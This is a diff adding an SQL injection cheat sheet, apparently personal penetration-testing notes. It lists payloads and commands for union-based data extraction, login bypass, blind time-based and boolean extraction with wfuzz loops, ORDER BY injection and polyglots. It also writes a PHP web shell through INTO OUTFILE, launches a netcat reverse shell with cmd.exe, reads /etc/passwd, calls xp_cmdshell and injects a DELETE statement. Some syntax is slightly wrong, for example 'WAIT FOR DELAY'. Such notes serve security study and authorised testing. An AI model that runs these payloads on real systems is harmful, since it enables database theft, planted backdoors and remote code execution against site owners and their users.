@@ -1,0 +1,284 @@
+SQLi
+see:
+xml/queries.xml from sqlmap root
+
+Begin testing by passing delimiters as input
+	COMMON
+'
+--
+#
+;
+''
+	ORACLE (most apply to postgresql)
+[space]
+||
+,
+/*
+.
+"
+'||'
+	MSSQL
++
+'+'
+
+enum
+http://10.11.1.35/php.php?var=1 order by 1
+	-upon finding a sqli vulnerable host iteration of order by value can reveal the number of columns
+http://10.11.1.35/php.php?var=1 union select all 1,2,3,5
+	-display each column, potentially with the column number value
+	-union statements allow select statements to be inserted
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,5,6
+	-this syntax unlike select all must have all columns 1-6 selected
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,@@version,6
+	-return mysql version number
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,user(),6
+	-display logged-in user being used for mysql instance connection
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+	-return table information schema
+http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+	-return schema for a table by name
+	concat(name,0x3a,password)
+		-concatenated values can be placed in the position of a sql columns to display otherwise hidden information in a corresponding html table column
+
+1 UNION ALL SELECT LOAD_FILE('/etc/passwd')--
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+	-create a php shell execution script taking an argument 'cmd' from a get request
+http://10.11.1.35/backdoor.php?cmd=nc.exe%20127.0.0.1%204444%20%25windir%25%5Csystem32%5Ccmd.exe
+	-execute a netcat reverse shell from host launching cmd.exe
+	
+fingerprint strings
+ORACLE
+'str'||'ing'
+BITAND(1,1)-BITAND(1,1)
+MSSQL
+'str'+'ing'
+@@PACK_RECIEVED-@@PACK_RECIEVED
+MySQL
+'str' 'ing'
+CONNECTION_ID()-CONNECTION_ID()
+/*!32302 and 1=0*/
+	
+
+exploit payload statements
+limit <offset>,<#rows>
+count(*)
+select(select database())
+	-nested query
+concat(something,somethingelse)
+substr(string,<offset>,<char len>)
+ascii(<char>)
+sleep(10)
+if(<condition>,<do true>,<do false>)
+like "string%"
+outfile "/path/to/file"
+load_file("/path/to/file")
+' exec master..xp_cmdshell 'command';-- -
+	--ms sql server only
+
+
+Login-bypass payloads
+' OR 1=1;-- -
+' OR "1"="1";-- -
+' OR 1=1 LIMIT 1;-- -
+' OR '1'='1
+' OR 1=1;#
+
+enumeration payloads
+@@version
+user()
+database()
+@@datadir
+group_concat(table_name) ... from information_schema.tables where table_schema=database();-- -
+group_concat(column_name) ... from information_schema.tables where table_name=<table_name>;-- -
+group_concat(column_name) ... from <table name>;-- -
+ and (substr(database(),<offset>,<char len>))='<char>' -- -
+	-db name by boolean-based blind SQL injection
+url payloads
+https://target.dom/?param=1')) union select column1,column2 from table into outfile "/path/to/file";-- -
+https://target.dom/?param=1' union select 1,2,@@version,4;-- -
+' and sleep(10);-- -
+' and if((select version()) like "5%", sleep(10), null);-- -
+	-determine database version number
+
+fuzzing commands
+wfuzz -c -z range,1-10 "https://target.dom/?param=1 order by FUZZ;-- -"
+for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "https://target.dom/?param=1' and (substr(database(),$i,1))='FUZZ';-- -";done
+	-boolean-based blind SQL injection observing http response size using substr()
+		--will not work with non-ascii special chars
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr(database(),$i,1)))=FUZZ ;-- -";done
+	-fix to work with non-ascii special chars
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ ;-- -";done
+	-now determine table name from database name
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ;-- -";done
+	-next determine column name from table name
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null);-- -";done > file.ext && grep "0m9" file.ext
+	-determine db name with time-based blind SQL injection observing http response time with substr() and ascii()
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(5), null);-- -";done > file.ext && grep "0m9" file.ext;
+	-determine column name with time-based blind SQL injection observing http response time with substr(), ascii() and if
+for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "https://target.dom/?param=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null);-- -";done > <file.ext && grep "0m9" file.ext
+	-extract column with time-based blind SQL injection observing http response time with substr(), ascii() and if
+	
+	
+ORDER BY injection statements:
+convert()
+file_name()
+db_name()
+col_name()
+filegroup_name()
+object_name()
+schema_name()
+type_name()
+cast()
+
+ORDER BY injection payload examples:
+?param=*&order=convert(int,@@version)
+	-backend full query example select table_name,column_name from information_schema.columns order by convert(int,@@version)
+?param=1order=CONVERT(int,(select top(1) table_name from information_schema.columns))
+?parama=1&order=convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7461626c655f6e616d650a as varchar)))
+	-where 0x7461626c655f6e616d650a is ascii->hex conversion for string "table_name"
+	--to convert ascii to hex from console run: echo 'table_name' | xxd -ps -
+	-query extracts columns from table name
+?param=1&order=convert(int,(select top(1) column_name from table_name))
+	-extract column name from table name
+?param=1&order=file_name(@@version)
+	-backend full query select table_name,column_name from information_schema.columns order by file_name(@@version)
+?param&order=CONVERT(int,(select top(1) table_name from information_schema.columns))
+	-extract table names of current db
+?param=1&order=convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7461626c655f6e616d650a as varchar)))
+	-Extract column name from table
+?parma=1&order=file_name((select top(1) column_name from table_name))
+	-Extract data from column of a table
+
+Injecting into anonymous PL\SQL blocks (Oracle)
+'; DELETE FROM products WHERE 'a'='a
+' AND 1=2 UNION SELECT password FROM members WHERE username='admin
+	-injection into dynamic cursors
+	
+Blind SQL Injection
+	2 basic types, time-based and error-based
+	time-based injections make boolean conditional statements on the evalution of which a delayed respose infers, commonly by setting
+		an arbitrary time delay or otherwise inducing an action that requires a sufficiently greater number of processing cycles to
+		complete than an expected http server response time
+	error-based injections conditionally return an error or non-random response indicative of an error response or erroneous value
+		on evaluation
+		--when a page is found to return an error consistent with sql statement evalution, as opposed to returning an error response
+			when injection payload escape (or other) characters are submitted as parameter values, that error can be conditionally
+			induced and the responses can be evaluated on a second order as boolean responses to sql statement evalution when an
+			injection must be exploited blind
+
+Condition Syntax
+MYSQL:
+IF(condition, when_true, when_false)
+	-used in syntax of a standard SQL statement, except stored procedures for which the syntax is identical to ORACLE/PL\SQL
+SQL Server:
+IF condition when_true [ELSE when_false]
+	-used in stored procedure or stacked query
+Oracle:
+IF condition THEN when_true [ELSE when_false] END IF
+	-only used in PL\SQL extension
+Pros/Cons of blind injections types:
+Time-based is less likely to leave logged traces of (error-returning) queries in log files.
+Time-based tends to be CPU and database connection thread intensive, which may causes errors or falsify results while retrieving responses at expected intervals.
+Error-based injection will usually complete execution of many requests significantly faster than time-delays.
+
+Time-Based Blind SQLi
+	Time-Delay Functions (by database)
+Mysql:
+SLEEP(#)
+BENCHMARK(count, expr)
+	--e.g. SELECT BENCHMARK(1000000,AES_ENCRYPT('hello','goodbye'));
+SQL Server:
+WAIT FOR DELAY 'hh,mm,ss'
+WAIT FOR TIME 'hh,mm,ss'
+ORACLE:
+BEGIN DBMS_LOCK.SLEEP(15); END;
+	-Oracle does not support stacked queries in dynamic SQL queries, statement only executed by dbms if SQL injection vulnerability in PL/SQL code or an anonymous PL/SQL block
+	--better to inject a Heavy Query instead of calling SLEEP() in Oracle, unlike other dbms
+	--only way to achieve time-base attacks in dynamic queries on Oracle
+Test for Time-based execution
+Mysql:
+=1-SLEEP(15)
+=1-BENCHMARK(100000000, rand())
+SQL Server:
+1; WAIT FOR DELAY '00:00:15'
+	WHERE Conditional
+	-Injected into queries stating roughly 'SELECT * FROM table_name WHERE column='
+1' OR sleep(2)--+-
+	Estimate table size stating WHERE Conditions
+	-This works because for each SELECT query executed by the database engine, all records returned by the statement are evaluated to validate they satisfy the WHERE clause condition.
+	--only works with MySQL(, because its time-delay function can be integrated to evaluate within SQL queries, as opposed to evaluating statically within a statement)
+1 AND 1=2 OR sleep(0.001)
+	-a response time consistent with standard server response time indicates that ether the parameter is not injectable or that a
+		table has very few columns
+1 AND 1=2 OR sleep(0.1)
+1 AND 1=2 OR sleep(1)
+	-deviation between response times evaluating sleep timers passed varying values should indicate an approximate size (in columns) of a table
+	Heavy Queries
+	-"heavy" queries are queries containing statements that will take noticeable time to get executed by the database engine
+SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C;
+	-standard heavy mysql query
+	--MS SQL Server and PostgreSQL queries follow the same syntactical rules
+1 AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
+1' OR 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);--+-
+	-generic mysql blind sqli heavy query
+SELECT count(*) FROM all_users A, all_users B, all_users C;
+	-standard heavy Oracle SQL query
+1 AND 1<SELECT count(*) FROM all_users A, all_users B, all_users C
+1' OR 1<SELECT count(*) FROM all_users A, all_users B, all_users C;--+-
+	Infering DBMS
+	--Determined by calling statements only available to one or few DBMS
+MySQL:
+POW(1,1)
+'abc' 'def'
+SQL Server:
+BITAND(1,1)
+'abc' + 'def'
+Oracle:
+SQUARE(1)
+'abc' || 'def'
+	Testing Database Version
+Mysql:
+1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)
+SQL Server:
+SELECT @@version
+1 UNION SELECT 1, 2, @@version
+1 AND 1=2 UNION SELECT 1, 2, @@version
+Oracle:
+SELECT banner FROM v$version WHERE rownum=1
+	Test User account:
+SQL Server:
+1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'
+ORACLE
+
+
+SQLI Polyglot Payloads
+		-adaptive type payloads
+	MySQL:
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+	--if server takes ~1 second to respond or longer it is likely vulnerable to an inejection type attack passed to a back-end database connection.
+	-1st checks MySQL database service @@version for instance
+		--if instance supports SLEEP(), then SLEEP(1) is called, else benchmask is assumed supported; BENCHMARK(2000000,SHA1(0xDE7EC71F1) is executed if MySQL server service version is 5 or older
+	-nests commands within each typed iteration of the unquoted root command around which the polyglot is constructed withing increasing precedence in the priority, or order of operations in which the command syntax is executed as quoted or unquote as a nested substriing which escapes its own execution contex by following with commenting characters to effectively escape all fallowing portions of the (itself && and any following character passed into or hard-coded into the application as executed at runtime).  
+
+
+
+ORM Injection
+	(Object Relational Mapping) Injection
+		--ORM implemented in object oriented development within the data access layer of software applications
+			--applies standardized code templates to a generated object layer to mapped to the relational database it will perform CRUD operations on
+		x--potentially vulnerable (to SQL injection) if web application using ORM generated objects if methods can accept unsanitized input parameters
+	-attack leveraging SQL Injection against an ORM generated data access object model
+	--attack payloads are standard SQLi payloads, but the
+		-injection vulnerability exists in code generated by the ORM tool
+	--common ORM Tools:
+		Hibernate - Java
+		Apache Cayanne - Java
+		Apache Gora - Java
+		NHibernate - .NET
+		SQLAlchemy - Python
+		Django (built-in) - Python
+		ActiveRecord - Ruby (Rails)
+		EZPDO - PHP
+			--Laravel and Zend frameworks have proprietary ORMs
+		Core Data - iOS/macOS
+		
